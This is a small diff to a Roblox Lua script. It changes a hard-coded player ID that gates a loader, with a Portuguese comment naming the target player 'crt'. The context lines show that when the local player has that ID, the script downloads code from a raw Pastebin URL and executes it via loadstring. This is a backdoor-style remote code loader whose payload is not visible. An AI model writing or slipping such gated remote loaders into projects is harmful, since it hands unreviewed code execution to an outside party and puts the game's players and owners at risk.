@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- Substitua pelo ID do jogador "crt"
-local ID_DO_CRT = 5270744306
+local ID_DO_CRT = 3067272302
 
 if player.UserId == ID_DO_CRT then
     loadstring(game:HttpGet("https://pastebin.com/raw/1WNnZvG0"))()
